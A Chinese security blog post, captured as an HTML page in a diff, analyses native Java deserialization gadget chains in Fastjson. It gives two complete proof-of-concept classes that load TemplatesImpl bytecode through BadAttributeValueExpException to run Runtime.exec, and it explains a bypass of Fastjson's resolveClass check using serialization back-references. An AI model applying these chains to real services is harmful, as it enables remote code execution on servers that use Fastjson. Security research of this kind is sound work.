@@ -1,0 +1,928 @@
+
+  <!DOCTYPE html>
+  <html lang="zh-CN"  data-theme="dark" >
+  <head>
+  <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="utf-8">
+  
+  <!-- Global site tag (gtag.js) - Google Analytics -->
+  <script src="https://www.googletagmanager.com/gtag/js?id=true"></script>
+  <script data-pjax>
+    window.dataLayer = window.dataLayer || [];
+
+    function gtag() {
+      dataLayer.push(arguments);
+    }
+
+    gtag('js', new Date());
+
+    gtag('config', 'true');
+  </script>
+  <!-- End Google Analytics -->
+
+
+  
+
+  
+  <script async src="https://hm.baidu.com/hm.js?true"></script>
+  <script data-pjax>
+    var _hmt = _hmt || [];
+    _hmt.push(["_trackPageview", location.pathname]);
+  </script>
+
+
+  
+  <script>window.icon_font = '4552607_tq6stt6tcg';window.clipboard_tips = {"success":"复制成功(*^▽^*)","fail":"复制失败 (ﾟ⊿ﾟ)ﾂ","copyright":{"enable":false,"count":50,"content":"本文版权：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处！"}};window.outdate = {"enable":true,"daysAgo":180,"message":"本文最后更新于 {time}，请注意文中内容可能已经发生变化。"};</script>
+  
+  
+  <title>
+    Fastjosn_Jackson_Hessian原生反序列化 |
+    
+    yyjccc的博客
+  </title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin><link rel="preload" as="style" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic%7CUbuntu%20Mono:400,400italic,700,700italic&display=swap"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic%7CUbuntu%20Mono:400,400italic,700,700italic&display=swap" media="print" onload="this.media&#x3D;&#39;all&#39;">
+  
+    <link rel="preload" href="//at.alicdn.com/t/c/font_4552607_tq6stt6tcg.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+  
+  
+    
+<link rel="stylesheet" href="/css/loader.css">
+
+  
+  <meta name="description" content="发一篇很久之前的内容，最近有接触到了一点 这里的原生反序化指的是不依赖于其他jar包的反序列化链，或者是指狭义的java反序列化readObject方法的调用 ‍ Fastjson原生反序列化‍ 条件fastjson 版本 &lt;&#x3D;2.0.26 (fastjson 1所有版本通杀) ‍ JSONArray与JSONObject 实现了序列化接口 这里的点在于toString 方法 JSONOb">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Fastjosn_Jackson_Hessian原生反序列化">
+<meta property="og:url" content="https://yyjccc.github.io/2025/02/08/Fastjosn-Jackson-Hessian%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/index.html">
+<meta property="og:site_name" content="yyjccc的博客">
+<meta property="og:description" content="发一篇很久之前的内容，最近有接触到了一点 这里的原生反序化指的是不依赖于其他jar包的反序列化链，或者是指狭义的java反序列化readObject方法的调用 ‍ Fastjson原生反序列化‍ 条件fastjson 版本 &lt;&#x3D;2.0.26 (fastjson 1所有版本通杀) ‍ JSONArray与JSONObject 实现了序列化接口 这里的点在于toString 方法 JSONOb">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://yyjccc.github.io/img/2025/2-8/Snipaste_2024-10-01_18-27-54-20241001182914-ng78365.png">
+<meta property="og:image" content="https://yyjccc.github.io/img/2025/2-8/Snipaste_2024-10-01_18-37-40-20241001183838-bbhir3h.png">
+<meta property="og:image" content="https://yyjccc.github.io/img/2025/2-8/Snipaste_2024-10-01_20-38-48-20241001203919-1uo6r7c.png">
+<meta property="og:image" content="https://yyjccc.github.io/img/2025/2-8/Snipaste_2024-10-01_20-47-07-20241001204723-r8atd3s.png">
+<meta property="og:image" content="https://yyjccc.github.io/img/2025/2-8/Snipaste_2024-10-01_20-55-21-20241001205556-7tyuqi0.png">
+<meta property="og:image" content="https://yyjccc.github.io/img/2025/2-8/Snipaste_2024-10-01_20-59-28-20241001205949-l5k1rqv.png">
+<meta property="og:image" content="https://yyjccc.github.io/img/2025/2-8/Snipaste_2024-10-01_21-42-11-20241001214249-cy1ifgx.png">
+<meta property="og:image" content="https://yyjccc.github.io/img/2025/2-8/Snipaste_2024-10-01_21-44-49-20241001214550-cgwa91h.png">
+<meta property="og:image" content="https://yyjccc.github.io/img/2025/2-8/Snipaste_2024-10-01_22-18-38-20241001222024-efjqzp0.png">
+<meta property="og:image" content="https://yyjccc.github.io/img/2025/2-8/Snipaste_2024-10-01_22-45-45-20241001224601-3i5udql.png">
+<meta property="og:image" content="https://yyjccc.github.io/img/2025/2-8/Snipaste_2024-10-01_22-48-26-20241001224855-0g0x6o2.png">
+<meta property="og:image" content="https://yyjccc.github.io/img/2025/2-8/Snipaste_2025-02-08_16-41-44-20250208164329-fc5sxfd.png">
+<meta property="og:image" content="https://yyjccc.github.io/img/2025/2-8/Snipaste_2025-02-08_16-49-59-20250208165157-3fywc5a.png">
+<meta property="og:image" content="https://yyjccc.github.io/img/2025/2-8/Snipaste_2024-10-03_16-18-56-20241003161933-tf9vu7u.png">
+<meta property="og:image" content="https://yyjccc.github.io/img/2025/2-8/Snipaste_2024-10-03_16-53-51-20241003165423-h3k5j0o.png">
+<meta property="og:image" content="https://yyjccc.github.io/img/2025/2-8/Snipaste_2024-10-03_16-56-23-20241003165639-iuactdc.png">
+<meta property="og:image" content="https://yyjccc.github.io/img/2025/2-8/Snipaste_2024-10-03_17-16-53-20241003171712-4skxk49.png">
+<meta property="og:image" content="https://yyjccc.github.io/img/2025/2-8/Snipaste_2024-10-03_17-20-52-20241003172110-xcgic7h.png">
+<meta property="og:image" content="https://yyjccc.github.io/img/2025/2-8/Snipaste_2024-10-03_17-23-05-20241003172329-ridyvvd.png">
+<meta property="og:image" content="https://yyjccc.github.io/img/2025/2-8/Snipaste_2024-10-03_17-34-48-20241003173609-ainrsfb.png">
+<meta property="og:image" content="https://yyjccc.github.io/img/2025/2-8/Snipaste_2024-10-03_18-12-10-20241003181228-pxb7a5t.png">
+<meta property="og:image" content="https://yyjccc.github.io/img/2025/2-8/Snipaste_2024-10-03_18-11-50-20241003181404-i903ofi.png">
+<meta property="og:image" content="https://yyjccc.github.io/img/2025/2-8/Snipaste_2024-10-28_14-31-12-20241028143353-o726eo3.png">
+<meta property="og:image" content="https://yyjccc.github.io/img/2025/2-8/Snipaste_2024-10-28_14-34-31-20241028143449-e75v1q6.png">
+<meta property="og:image" content="https://yyjccc.github.io/img/2025/2-8/Snipaste_2024-10-28_14-25-30-20241028142656-0kj3iwu.png">
+<meta property="og:image" content="https://yyjccc.github.io/img/2025/2-8/Snipaste_2024-10-28_14-37-10-20241028143731-hqjyo46.png">
+<meta property="og:image" content="https://yyjccc.github.io/img/2025/2-8/Snipaste_2024-10-28_15-26-59-20241028152722-ar2qhrq.png">
+<meta property="og:image" content="https://yyjccc.github.io/img/2025/2-8/Snipaste_2024-10-28_15-50-20-20241028155053-ha42x41.png">
+<meta property="og:image" content="https://yyjccc.github.io/img/2025/2-8/Snipaste_2024-10-28_15-52-03-20241028155253-y3510k6.png">
+<meta property="article:published_time" content="2025-02-08T08:59:50.866Z">
+<meta property="article:modified_time" content="2025-02-08T09:49:48.525Z">
+<meta property="article:author" content="Yyjccc">
+<meta property="article:tag" content="java安全">
+<meta property="article:tag" content="反序列化漏洞">
+<meta property="article:tag" content="fastjson">
+<meta property="article:tag" content="hessian">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://yyjccc.github.io/img/2025/2-8/Snipaste_2024-10-01_18-27-54-20241001182914-ng78365.png">
+  
+    <link rel="alternate" href="/atom.xml" title="yyjccc的博客" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/images/favicon.ico">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  <link rel="preload" href="https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+  
+  
+  
+    
+      
+<link rel="stylesheet" href="https://npm.webcache.cn/gitalk/dist/gitalk.css">
+
+    
+  
+  
+<script src="https://npm.webcache.cn/pace-js@1.2.4/pace.min.js"></script>
+
+  
+    
+<link rel="stylesheet" href="https://npm.webcache.cn/@reimujs/aos@0.0.1/dist/aos.css">
+
+  
+<meta name="generator" content="Hexo 6.3.0">
+<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style><!-- hexo-inject:begin --><!-- hexo-inject:end -->
+</head>
+
+  <body>
+    
+  <!-- hexo-inject:begin --><!-- hexo-inject:end --><div id='loader'>
+    <div class="loading-left-bg loading-bg"></div>
+    <div class="loading-right-bg loading-bg"></div>
+    <div class="spinner-box">
+      <div class="loading-taichi">
+        <svg width="150" height="150" viewBox="0 0 1024 1024" class="icon" version="1.1" xmlns="https://www.w3.org/2000/svg" shape-rendering="geometricPrecision">
+          <path d="M303.5 432A80 80 0 0 1 291.5 592A80 80 0 0 1 303.5 432z" fill="#ff5252" />
+          <path d="M512 65A447 447 0 0 1 512 959L512 929A417 417 0 0 0 512 95A417 417 0 0 0 512 929L512 959A447 447 0 0 1 512 65z 
+         M512 95A417 417 0 0 1 929 512A208.5 208.5 0 0 1 720.5 720.5L720.5 592A80 80 0 0 0 720.5 432A80 80 0 0 0 720.5 592L720.5 720.5A208.5 208.5 0 0 1 512 512A208.5 208.5 0 0 0 303.5 303.5A208.5 208.5 0 0 0 95 512A417 417 0 0 1 512 95z" fill="#ff5252" />
+        </svg>
+      </div>
+      <div class="loading-word">少女祈祷中...</div>
+    </div>
+  </div>
+  </div>
+  <script>
+    var time = null;
+    var startLoading = () => {
+      time = Date.now();
+      document.getElementById('loader').classList.remove("loading");
+    }
+    var endLoading = () => {
+      if (!time) {
+        document.body.style.overflow = 'auto';
+        document.getElementById('loader').classList.add("loading");
+      } else {
+        if (Date.now() - time > 500) {
+          time = null;
+          document.body.style.overflow = 'auto';
+          document.getElementById('loader').classList.add("loading");
+        } else {
+          setTimeout(endLoading, 500 - (Date.now() - time));
+          time = null;
+        }
+      }
+    }
+    window.addEventListener('DOMContentLoaded', endLoading);
+    document.getElementById('loader').addEventListener('click', endLoading);
+  </script>
+
+<div id="copy-tooltip" style="pointer-events: none; opacity: 0; transition: all 0.2s ease; position: fixed;top: 50%;left: 50%;z-index: 999;transform: translate(-50%, -50%);color: white;background: rgba(0, 0, 0, 0.5);padding: 10px 15px;border-radius: 10px;">
+</div>
+
+
+    <div id="container">
+      <div id="wrap">
+        <div id="header-nav">
+  <nav id="main-nav">
+    
+      <span class="main-nav-link-wrap">
+        <div class="main-nav-icon icon-taichi"></div>
+        <a class="main-nav-link" href="/">首页</a>
+      </span>
+    
+      <span class="main-nav-link-wrap">
+        <div class="main-nav-icon icon-taichi"></div>
+        <a class="main-nav-link" href="/archives">归档</a>
+      </span>
+    
+      <span class="main-nav-link-wrap">
+        <div class="main-nav-icon icon-taichi"></div>
+        <a class="main-nav-link" href="/about">关于</a>
+      </span>
+    
+      <span class="main-nav-link-wrap">
+        <div class="main-nav-icon icon-taichi"></div>
+        <a class="main-nav-link" href="/friend">友链</a>
+      </span>
+    
+    <a id="main-nav-toggle" class="nav-icon"></a>
+  </nav>
+  <nav id="sub-nav">
+    
+      <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS 订阅"></a>
+    
+    
+    
+      <a id="nav-search-btn" class="nav-icon popup-trigger" title="搜索"></a>
+    
+  </nav>
+</div>
+<header id="header">
+  
+    <img fetchpriority="high" src="/images/cover/8.png" alt="Fastjosn_Jackson_Hessian原生反序列化">
+  
+  <div id="header-outer">
+    <div id="header-title">
+      
+        
+        
+          <a href="/" id="logo">
+            <h1 data-aos="slide-up">Fastjosn_Jackson_Hessian原生反序列化</h1>
+          </a>
+        
+      
+      
+        
+        <h2 id="subtitle-wrap" data-aos="slide-down">
+          
+        </h2>
+      
+    </div>
+  </div>
+</header>
+
+        <div id="content">
+          
+          <section id="main"><article id="post-Fastjosn-Jackson-Hessian原生反序列化" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-inner" data-aos="fade-up">
+    <div class="article-meta">
+      <div class="article-date">
+  <a href="/2025/02/08/Fastjosn-Jackson-Hessian%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" class="article-date-link" data-aos="zoom-in">
+    <time datetime="2025-02-08T08:59:50.866Z" itemprop="datePublished">2025-02-08</time>
+    <time style="display: none;" id="post-update-time">2025-02-08</time>
+  </a>
+</div>
+
+      
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/java/" data-aos="zoom-in">java</a>
+  </div>
+
+
+    </div>
+    <div class="hr-line"></div>
+    
+
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <blockquote id="outdate-blockquote" style="display: none;"><p></p></blockquote>
+      
+      
+        <p> 发一篇很久之前的内容，最近有接触到了一点</p>
+<p>这里的原生反序化指的是不依赖于其他jar包的反序列化链，或者是指狭义的java反序列化readObject方法的调用</p>
+<p>‍</p>
+<h2 id="Fastjson原生反序列化"><a href="#Fastjson原生反序列化" class="headerlink" title="Fastjson原生反序列化"></a>Fastjson原生反序列化</h2><p>‍</p>
+<h3 id="条件"><a href="#条件" class="headerlink" title="条件"></a>条件</h3><p>fastjson 版本 &lt;=2.0.26</p>
+<p>(fastjson 1所有版本通杀)</p>
+<p>‍</p>
+<p><code>JSONArray与JSONObject</code> 实现了序列化接口</p>
+<p>这里的点在于toString 方法</p>
+<p>JSONObject 和 JSONArray 的toString 方法都是父类JSON 的toString 方法</p>
+<p><img src="/img/2025/2-8/Snipaste_2024-10-01_18-27-54-20241001182914-ng78365.png">​</p>
+<p>‍</p>
+<p>在之前学习fastjson BCEL链的时候，就知道要用parse 方法触发，也就是套几层，时key为JSONObject 对象，调用对应的toString 方法（fastjson&lt;=1.2.36），就会触发对应的getter方法，这里就再来具体看看</p>
+<p>‍</p>
+<h3 id="toString-触发getter"><a href="#toString-触发getter" class="headerlink" title="toString() 触发getter"></a>toString() 触发getter</h3><p>跟进<code>JSONSerializer#write</code>​</p>
+<p>在<code>SerializeConfig#getObjectWriter</code>​ 根据我们的类型获取<code>ObjectWriter</code>​</p>
+<p><img src="/img/2025/2-8/Snipaste_2024-10-01_18-37-40-20241001183838-bbhir3h.png">​</p>
+<p>但是JSONObject 是实现了Map接口的，所以会先获取到</p>
+<p>当然获取的是<code>MapSerializer</code>​</p>
+<p>跟进write方法，这里 会对取出其中的key和value 获取<code>ObjectWriter</code>​ 再write</p>
+<p>当value 是 一般的类的时候，就会走到<code>createJavaBeanSerializer</code>​ 方法 ，之前看过就不再赘述</p>
+<p>值得再提的是fastjson 默认配置asm 为 true,所以会使用ASM生成一个类，当然可以手动配置为false ，就会获取到<code>JavaBeanSerializer</code>​</p>
+<p>无论哪个都是靠 调用由<code> TypeUtils#buildBeanInfo</code>​ 提取的getter 来获取 javabean 的属性值</p>
+<p><img src="/img/2025/2-8/Snipaste_2024-10-01_20-38-48-20241001203919-1uo6r7c.png">​</p>
+<p>ASM 方式的 getter方法调用 的生成在<code>com.alibaba.fastjson.serializer.ASMSerializerFactory#_get</code>​当中</p>
+<p><img src="/img/2025/2-8/Snipaste_2024-10-01_20-47-07-20241001204723-r8atd3s.png">​</p>
+<p>也是通过反射调用</p>
+<p>‍</p>
+<p>‍</p>
+<h3 id="利用链"><a href="#利用链" class="headerlink" title="利用链"></a>利用链</h3><p>既然只能触发get方法的调用那么很容易想到通过触发TemplatesImpl的getOutputProperties方法实现加载任意字节码最终触发恶意方法调用</p>
+<p>而触发toString方法我们也有现成的链，通过BadAttributeValueExpException触发即可</p>
+<p>因此我们很容易写出利用链子</p>
+<figure class="highlight java"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSONArray;</span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> javassist.CtConstructor;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> {</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setValue</span><span class="params">(Object obj, String name, Object value)</span> <span class="keyword">throws</span> Exception{</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(name);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception{</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">clazz</span> <span class="operator">=</span> pool.makeClass(<span class="string">"a"</span>);</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">superClass</span> <span class="operator">=</span> pool.get(AbstractTranslet.class.getName());</span><br><span class="line">        clazz.setSuperclass(superClass);</span><br><span class="line">        <span class="type">CtConstructor</span> <span class="variable">constructor</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CtConstructor</span>(<span class="keyword">new</span> <span class="title class_">CtClass</span>[]{}, clazz);</span><br><span class="line">        constructor.setBody(<span class="string">"Runtime.getRuntime().exec(\"calc\");"</span>);</span><br><span class="line">        clazz.addConstructor(constructor);</span><br><span class="line">        <span class="type">byte</span>[][] bytes = <span class="keyword">new</span> <span class="title class_">byte</span>[][]{clazz.toBytecode()};</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> TemplatesImpl.class.newInstance();</span><br><span class="line">        setValue(templates, <span class="string">"_bytecodes"</span>, bytes);</span><br><span class="line">        setValue(templates, <span class="string">"_name"</span>, <span class="string">"yyjccc"</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">JSONArray</span> <span class="variable">jsonArray</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JSONArray</span>();</span><br><span class="line">        jsonArray.add(templates);</span><br><span class="line"></span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">val</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="literal">null</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">valfield</span> <span class="operator">=</span> val.getClass().getDeclaredField(<span class="string">"val"</span>);</span><br><span class="line">        valfield.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        valfield.set(val, jsonArray);</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">barr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(barr);</span><br><span class="line">        objectOutputStream.writeObject(val);</span><br><span class="line"></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(barr.toByteArray()));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> (Object)ois.readObject();</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
+
+<p>或者</p>
+<figure class="highlight java"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson2.JSONArray;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> javassist.CtConstructor;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> {</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setValue</span><span class="params">(Object obj, String name, Object value)</span> <span class="keyword">throws</span> Exception{</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(name);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception{</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">clazz</span> <span class="operator">=</span> pool.makeClass(<span class="string">"a"</span>);</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">superClass</span> <span class="operator">=</span> pool.get(AbstractTranslet.class.getName());</span><br><span class="line">        clazz.setSuperclass(superClass);</span><br><span class="line">        <span class="type">CtConstructor</span> <span class="variable">constructor</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CtConstructor</span>(<span class="keyword">new</span> <span class="title class_">CtClass</span>[]{}, clazz);</span><br><span class="line">        constructor.setBody(<span class="string">"Runtime.getRuntime().exec(\"calc\");"</span>);</span><br><span class="line">        clazz.addConstructor(constructor);</span><br><span class="line">        <span class="type">byte</span>[][] bytes = <span class="keyword">new</span> <span class="title class_">byte</span>[][]{clazz.toBytecode()};</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> TemplatesImpl.class.newInstance();</span><br><span class="line">        setValue(templates, <span class="string">"_bytecodes"</span>, bytes);</span><br><span class="line">        setValue(templates, <span class="string">"_name"</span>, <span class="string">"yyjccc"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">JSONObject</span> <span class="variable">jsonObject</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JSONObject</span>();</span><br><span class="line">        jsonObject.put(<span class="string">"1"</span>, templates);</span><br><span class="line"></span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">val</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="literal">null</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">valfield</span> <span class="operator">=</span> val.getClass().getDeclaredField(<span class="string">"val"</span>);</span><br><span class="line">        valfield.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        valfield.set(val, jsonObject);</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">barr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(barr);</span><br><span class="line">        objectOutputStream.writeObject(val);</span><br><span class="line"></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(barr.toByteArray()));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> (Object)ois.readObject();</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
+
+<h3 id="1-2-49的限制"><a href="#1-2-49的限制" class="headerlink" title="1.2.49的限制"></a>1.2.49的限制</h3><p>从1.2.49开始，我们的JSONArray以及JSONObject方法开始真正有了自己的readObject方法</p>
+<p><img src="/img/2025/2-8/Snipaste_2024-10-01_20-55-21-20241001205556-7tyuqi0.png">​</p>
+<p>在其<code>SecureObjectInputStream</code>​类当中重写了<code>resolveClass</code>​,在其中调用了<code>checkAutoType</code>​方法做类的检查</p>
+<p><img src="/img/2025/2-8/Snipaste_2024-10-01_20-59-28-20241001205949-l5k1rqv.png">​</p>
+<p>这又进入了熟悉的checkAutoType方法</p>
+<p>‍</p>
+<h3 id="resolveClass限制绕过"><a href="#resolveClass限制绕过" class="headerlink" title="resolveClass限制绕过"></a>resolveClass限制绕过</h3><p>要想知道resolve 是 怎么绕过的，就得对java 反序列化的流程有一定的了解（我不太了解，（：）</p>
+<p>直接反向看，查看什么地方会调用  <code>resolveClass</code>​方法,他这里是重写了<code>ObjectInputStream#resolveClass</code>​</p>
+<p>发现只有一处调用：<code>readNonProxyDesc</code>​方法中</p>
+<p><img src="/img/2025/2-8/Snipaste_2024-10-01_21-42-11-20241001214249-cy1ifgx.png">​</p>
+<p>在<code>readClassDesc</code>​中调用了<code>readNonProxyDesc</code>​</p>
+<p><img src="/img/2025/2-8/Snipaste_2024-10-01_21-44-49-20241001214550-cgwa91h.png">​</p>
+<p>​<code>readClassDesc</code>​方法从系统中读取当前Java对象所属类的描述信息，（关键点还不是这里）</p>
+<p>这里对比一下流程</p>
+<figure class="highlight java"><table><tbody><tr><td class="code"><pre><span class="line">ObjectInputStream -&gt;readObject0-&gt; readClassDesc-&gt; ... -&gt; </span><br><span class="line">SecureObjectInputStream -&gt;defaultReadObject-&gt;readObject0 -&gt;readClassDesc-&gt;  resolveClass</span><br></pre></td></tr></tbody></table></figure>
+
+<p>当然也可以不按照上面的流程，</p>
+<p>注意到readObject0 中的switch 分支</p>
+<p><img src="/img/2025/2-8/Snipaste_2024-10-01_22-18-38-20241001222024-efjqzp0.png">​</p>
+<p>大多时候都是走<code>TC_OBJECT</code>​这个分支</p>
+<p>但是还要注意到上面的<code>TC_REFERENCE</code>​ 分支，引用类型</p>
+<p>注释也写的很清楚：<code> check the type of the existing object</code></p>
+<p>引用类型，在java中 对象的内存是分配在堆上的，在不同的地方使用同一个对象，对象指向的都是同一块内存区域，</p>
+<p>跟进<code>readHandle</code>​方法中</p>
+<p><img src="/img/2025/2-8/Snipaste_2024-10-01_22-45-45-20241001224601-3i5udql.png">​</p>
+<p>从缓存中获取对应的对象</p>
+<p><img src="/img/2025/2-8/Snipaste_2024-10-01_22-48-26-20241001224855-0g0x6o2.png">​</p>
+<p>那么只要在序列化的对象中内部重复放入同一个对象，那么第二个就会变为引用的分支（这样也可以减少重复的反序列化）</p>
+<p>怎么操作呢？</p>
+<p>​<code>答案是当向List、set、map类型中添加同样对象(被限制的加载类的对象)时即可成功利用，</code>​</p>
+<p>这样就很巧妙，利用这些容器类，可以在反序列化JSONObject/JSONArray对象之前 就反序列化好恶意的TemplatesImpl对象</p>
+<p>当反序列化JSONObject/JSONArray 当中的恶意对象时候就会走引用类型</p>
+<p>这样就绕过了重写的 resolveClass 对类加载的限制</p>
+<p>‍</p>
+<p>最后poc</p>
